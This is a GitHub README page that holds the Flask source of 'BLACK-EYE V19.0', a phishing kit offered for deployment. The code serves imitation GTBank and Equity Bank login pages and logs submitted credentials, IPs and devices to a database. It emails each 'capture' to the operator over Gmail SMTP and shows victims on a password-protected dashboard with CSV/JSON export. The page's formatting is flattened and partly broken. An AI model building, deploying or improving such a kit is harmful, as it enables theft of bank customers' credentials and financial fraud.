Skip to content
Felix-koskey-p-script-
Repository navigation
Code
Issues
Pull requests
Felix-koskey-p-script-
/README.md
Felix954
Felix954
1 minute ago
643 lines (595 loc) · 20.3 KB

Preview

Code

Blame
Felix-koskey-p-script-
My railway deployment project margin-bottom: 20px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; } .filters select, .filters input { padding: 10px 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; } table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); } th, td { padding: 16px; text-align: left; border-bottom: 1px solid #f0f0f0; } th { background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; font-weight: 700; text-transform: uppercase; font-size: 13px; letter-spacing: 0.5px; } tr:hover { background: #f8f9fa; } .site-badge { background: #667eea; color: #fff; padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 700; text-transform: uppercase; } .site-badge.gtbank { background: #ff6600; } .site-badge.equity { background: #b71c1c; } .device-badge { background: #f0f0f0; color: #666; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; } .device-badge.mobile { background: #e3f2fd; color: #1976d2; } .data-cell { max-width: 350px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: 'Courier New', monospace; font-size: 13px; color: #333; } .view-btn { background: #667eea; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; } .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; align-items: center; justify-content: center; } .modal.show { display: flex; } .modal-content { background: #fff; padding: 40px; border-radius: 12px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto; } .modal-content h2 { margin-bottom: 20px; color: #333; } .modal-content pre { background: #f5f5f5; padding: 20px; border-radius: 8px; overflow-x: auto; font-size: 13px; line-height: 1.6; } .close-modal { background: #ff4757; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; float: right; margin-top: 20px; } .refresh-indicator { position: fixed; top: 20px; right: 20px; background: #2ed573; color: #fff; padding: 12px 20px; border-radius: 8px; font-size: 14px; font-weight: 600; box-shadow: 0 4px 12px rgba(46,213,115,0.3); animation: pulse 2s infinite; } @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } } .empty-state { text-align: center; padding: 60px 20px; color: #999; } .empty-state-icon { font-size: 64px; margin-bottom: 20px; } </style> <script> let currentPassword = null;

    function checkAuth() {
        if (!currentPassword) {
            const password = prompt("🔐 Enter admin password:");
            if (password !== "''' + ADMIN_PASSWORD + '''") {
                alert("❌ Access denied!");
                window.location.href = "/";
                return false;
            }
            currentPassword = password;
        }
        return true;
    }
    
    function refreshData() {
        fetch('/api/captures')
            .then(r => r.json())
            .then(data => {
                document.getElementById('total').textContent = data.total;
                document.getElementById('today').textContent = data.today;
                document.getElementById('mobile').textContent = data.mobile;
                document.getElementById('desktop').textContent = data.desktop;
                
                if (data.captures.length === 0) {
                    document.getElementById('captures-table').innerHTML = `
                        <tr><td colspan="7" class="empty-state">
                            <div class="empty-state-icon">🎯</div>
                            <div>No captures yet. Waiting for victims...</div>
                        </td></tr>
                    `;
                    return;
                }
                
                let html = '';
                data.captures.forEach(c => {
                    const siteClass = c.site.toLowerCase();
                    const deviceClass = c.device.toLowerCase();
                    html += `<tr>
                        <td><strong>#${c.id}</strong></td>
                        <td>${c.timestamp}</td>
                        <td><span class="site-badge ${siteClass}">${c.site}</span></td>
                        <td>${c.ip}</td>
                        <td><span class="device-badge ${deviceClass}">${c.device}</span></td>
                        <td class="data-cell" title="${c.data}">${c.data}</td>
                        <td><button class="view-btn" onclick="viewDetails(${c.id}, '${c.site}', '${c.timestamp}', '${c.ip}', '${c.data.replace(/'/g, "\\'")}')">View</button></td>
                    </tr>`;
                });
                document.getElementById('captures-table').innerHTML = html;
            });
    }
    
    function viewDetails(id, site, time, ip, data) {
        document.getElementById('modal-details').innerHTML = `
            <h2>🎯 Capture #${id}</h2>
            <p><strong>Site:</strong> ${site}</p>
            <p><strong>Time:</strong> ${time}</p>
            <p><strong>IP:</strong> ${ip}</p>
            <h3 style="margin-top:20px">Captured Data:</h3>
            <pre>${data}</pre>
        `;
        document.getElementById('detailsModal').classList.add('show');
    }
    
    function closeModal() {
        document.getElementById('detailsModal').classList.remove('show');
    }
    
    function clearDatabase() {
        if (confirm("⚠️ Delete all captures? This cannot be undone!")) {
            fetch('/api/clear', {method: 'POST'})
                .then(r => r.json())
                .then(data => {
                    alert("✅ " + data.message);
                    refreshData();
                });
        }
    }
    
    if (checkAuth()) {
        setInterval(refreshData, 3000);
        refreshData();
    }
</script>
🔄 Auto-refresh: 3s
<div class="container">
    <div class="header">
        <div>
            <h1>🎯 BLACK-EYE Dashboard</h1>
            <p style="color:#666;margin-top:8px">Real-time capture monitoring</p>
        </div>
        <div style="text-align:right">
            <div style="font-size:14px;color:#666">Admin Panel</div>
            <div style="font-size:12px;color:#999">v19.0 Hybrid</div>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-number" id="total">0</div>
            <div class="stat-label">Total Captures</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="today">0</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="mobile">0</div>
            <div class="stat-label">Mobile</div>
        </div>
        <div class="stat-card">
            <div class="stat-number" id="desktop">0</div>
            <div class="stat-label">Desktop</div>
        </div>
    </div>
    
    <div class="actions">
        <a href="/export/csv" class="btn btn-success">📥 Export CSV</a>
        <a href="/export/json" class="btn btn-success">📥 Export JSON</a>
        <button class="btn" onclick="refreshData()">🔄 Refresh Now</button>
        <button class="btn btn-danger" onclick="clearDatabase()">🗑️ Clear All</button>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Timestamp</th>
                <th>Site</th>
                <th>IP Address</th>
                <th>Device</th>
                <th>Data Preview</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody id="captures-table">
            <tr><td colspan="7" style="text-align:center;padding:40px">
                <div style="font-size:20px">⏳</div>
                <div style="margin-top:10px;color:#666">Loading captures...</div>
            </td></tr>
        </tbody>
    </table>
</div>

<div class="modal" id="detailsModal" onclick="if(event.target===this)closeModal()">
    <div class="modal-content" id="modal-details">
        <button class="close-modal" onclick="closeModal()">✕ Close</button>
    </div>
</div>
''')
🔥 API: Get captures (ENHANCED)
@app.route('/api/captures') def api_captures(): captures = get_captures(100) today = datetime.now().date().isoformat()

formatted = []
today_count = 0
mobile_count = 0
desktop_count = 0

for c in captures:
    formatted.append({
        'id': c[0],
        'timestamp': c[1][:19],  # Remove milliseconds
        'site': c[2].upper(),
        'ip': c[3],
        'device': c[7] if len(c) > 7 else 'Unknown',
        'data': c[5]
    })
    if c[1].startswith(today):
        today_count += 1
    if len(c) > 7 and c[7] == 'Mobile':
        mobile_count += 1
    else:
        desktop_count += 1

return jsonify({
    'total': len(captures),
    'today': today_count,
    'mobile': mobile_count,
    'desktop': desktop_count,
    'captures': formatted
})
🔥 API: Clear database
@app.route('/api/clear', methods=['POST']) def api_clear(): conn = sqlite3.connect('captures.db') conn.execute('DELETE FROM captures') conn.commit() conn.close() return jsonify({'message': 'All captures deleted successfully'})

🔥 Export to CSV (ENHANCED)
@app.route('/export/csv') def export_csv(): captures = get_captures(1000)

output = StringIO()
writer = csv.writer(output)
writer.writerow(['ID', 'Timestamp', 'Site', 'IP Address', 'Device', 'User Agent', 'Captured Data'])

for c in captures:
    writer.writerow([c[0], c[1], c[2], c[3], c[7] if len(c) > 7 else 'Unknown', c[4], c[5]])

output.seek(0)
response = Response(output.getvalue(), mimetype='text/csv')
response.headers['Content-Disposition'] = f'attachment; filename=captures_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
return response
🔥 Export to JSON
@app.route('/export/json') def export_json(): captures = get_captures(1000)

data = []
for c in captures:
    data.append({
        'id': c[0],
        'timestamp': c[1],
        'site': c[2],
        'ip': c[3],
        'user_agent': c[4],
        'data': json.loads(c[5]),
        'device': c[7] if len(c) > 7 else 'Unknown'
    })

response = Response(json.dumps(data, indent=2), mimetype='application/json')
response.headers['Content-Disposition'] = f'attachment; filename=captures_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
return response
Landing page
@app.route('/') def index(): return render_template_string('''

<title>Sites Available</title> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #667eea, #764ba2); min-height: 100vh; padding: 40px 20px; } .container { max-width: 1000px; margin: 0 auto; background: #fff; border-radius: 20px; padding: 50px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); } h1 { text-align: center; margin-bottom: 15px; font-size: 42px; color: #333; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } .subtitle { text-align: center; color: #666; margin-bottom: 50px; font-size: 18px; } .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-bottom: 40px; } .card { background: linear-gradient(135deg, #667eea, #764ba2); padding: 40px; border-radius: 15px; text-align: center; transition: all 0.3s; cursor: pointer; box-shadow: 0 8px 20px rgba(102,126,234,0.3); position: relative; overflow: hidden; } .card:before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%); transform: scale(0); transition: transform 0.5s; } .card:hover:before { transform: scale(1); } .card:hover { transform: translateY(-10px); box-shadow: 0 15px 35px rgba(102,126,234,0.5); } .card.ultra { background: linear-gradient(135deg, #ff6600, #ff8533); } .card.ultra:hover { box-shadow: 0 15px 35px rgba(255,102,0,0.5); } .card a { color: #fff; text-decoration: none; font-size: 26px; font-weight: 700; display: block; position: relative; z-index: 1; } .badge { background: rgba(255,255,255,0.2); color: #fff; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: 700; margin-top: 12px; display: inline-block; text-transform: uppercase; letter-spacing: 1px; } .admin-link { text-align: center; margin-top: 30px; padding-top: 30px; border-top: 2px solid #f0f0f0; } .admin-link a { background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; padding: 15px 40px; border-radius: 10px; text-decoration: none; font-weight: 700; font-size: 18px; display: inline-block; transition: all 0.3s; } .admin-link a:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(102,126,234,0.4); } </style>
🎯 BLACK-EYE Sites
Ultra-realistic phishing templates

GTBANK
⭐⭐⭐ Ultra-Realistic
EQUITY BANK
⭐⭐⭐ Ultra-Realistic
🔐 Admin Dashboard
''')
Sites
@app.route('/') def serve_site(site): if site in TEMPLATES: return render_template_string(TEMPLATES[site]) return ("Site not found", 404)

Capture endpoint (ENHANCED with better tracking)
@app.route('/capture/', methods=['POST']) def capture(site): try: data = request.get_json() ip = request.headers.get('X-Forwarded-For', request.remote_addr) user_agent = request.headers.get('User-Agent', 'Unknown')

    # Save to database
    save_capture(site, ip, user_agent, data)
    
    # Send email notification (background thread)
    def send_email():
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            msg = MIMEMultipart()
            msg['From'] = formataddr((f'{site.upper()} Alert', EMAIL_FROM))
            msg['To'] = EMAIL_TO
            msg['Subject'] = f'🎯 {site.upper()} Capture - {timestamp}'
            msg['Message-ID'] = make_msgid(domain='gmail.com')
            
            body = f"""🎯 NEW CAPTURE ALERT
Site: {site.upper()} Time: {timestamp} IP Address: {ip} Device: {"Mobile" if "Mobile" in user_agent else "Desktop"}

Captured Credentials: {json.dumps(data, indent=2)}

{'='*50}

Access dashboard: https://yourapp.railway.app/admin """

            msg.attach(MIMEText(body, 'plain'))
            
            srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
            srv.starttls()
            srv.login(EMAIL_FROM, EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
        except Exception as e:
            print(f"Email error: {e}")
    
    threading.Thread(target=send_email, daemon=True).start()
    
    return jsonify({"success": True})
except Exception as e:
    return jsonify({"error": str(e)}), 500
Health check
@app.route('/health') def health(): return jsonify({ "status": "online", "version": "19.0-HYBRID", "sites": list(TEMPLATES.keys()), "features": ["ultra-realistic", "dashboard", "csv-export", "real-time"] })

if name == 'main': port = int(os.environ.get('PORT', 5000)) print(f""" ╔════════════════════════════════════════════════════════╗ ║ BLACK-EYE V19.0 - HYBRID EDITION ║ ║ 🎯 Ultra-Realistic + Live Dashboard ║ ╚════════════════════════════════════════════════════════╝

🚀 Server starting on port {port}

📊 Dashboard: http://localhost:{port}/admin 🔑 Password: {ADMIN_PASSWORD}

🌐 Available Sites: • GTBank: http://localhost:{port}/gtbank ⭐⭐⭐ • Equity: http://localhost:{port}/equity ⭐⭐⭐

✅ Features: • Ultra-realistic templates • Real-time dashboard (3s refresh) • CSV/JSON export • Email notifications • Device tracking • Database storage

Press Ctrl+C to stop """)

app.run(host='0.0.0.0', port=port, debug=False)
